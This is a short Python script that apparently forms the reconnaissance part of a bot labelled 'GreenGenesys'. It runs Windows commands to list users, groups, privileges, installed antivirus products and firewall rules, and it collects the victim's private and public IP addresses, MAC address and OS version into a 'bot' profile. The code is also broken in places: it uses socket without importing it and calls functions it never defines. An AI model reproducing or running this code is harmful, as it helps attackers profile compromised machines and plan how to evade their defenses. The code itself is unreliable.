import os, sys, requests, platform, uuid, re
from random import choice, randint

cmds = {
    'usrinf':'net user {usr}',
    'grpinf':'net localgroup {grp}',
    'whoami':'echo %USERNAME% || whoami',
    'usrprivs':'whoami /priv',
    'installedavs':r'wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName',
    'fwinfo': 'netsh firewall show state & netsh firewall show config',
    'blockedfwports': 'powershell "$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports"'
}

def cmd(value, user=None, group=None):
    try: return os.popen(cmds[value].format(usr=user, grp=group)).read().rstrip()
    except Exception as e: return e

def getSysInfo():
    try: s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(0); s.connect(('10.255.255.255', 1)); privip = s.getsockname()[0]; s.close()
    except: privip = '127.0.0.1'
    try: pubip = requests.get(choice(['https://wtfismyip.com/text','https://api.my-ip.io/ip','https://api.ipify.org','http://checkip.amazonaws.com'])).text.rstrip()
    except: pubip = 'None'

    return {
        'sys': { 'os': sys.platform, 'ver': platform.version(),'pyver':sys.version,'mac':':'.join(re.findall('..','%012x'%uuid.getnode())) },
        'usr': { 'name': whoami(), 'privs': givePrivs(), 'info': getusrinfo(whoami())},
        'ip': { 'private': privip, 'public': pubip },
        'bot': { 'ver': 'GreenGenesys'}
    }